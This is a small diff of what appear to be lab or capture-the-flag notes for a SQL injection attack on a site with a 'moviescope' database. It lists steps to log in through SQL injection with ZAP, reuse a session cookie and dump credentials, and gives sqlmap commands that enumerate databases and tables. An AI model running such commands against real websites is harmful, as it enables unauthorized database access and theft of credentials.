@@ -4,7 +4,7 @@ Step 1 – Log in to the website (SQLi with ZAP or create account)
 
 Step 2 – Get session cookie (logged in user)
 
-Step 3 - ENUMERATE databases + dump (CREDENTIALS)
+Step 3 - ENUMERATE DATABASES + dump (CREDENTIALS)
 
 sqlmap -u "URL" --cookie="cookie" --dbs
 sqlmap -u "URL" --cookie="cookie" -D moviescope --tables
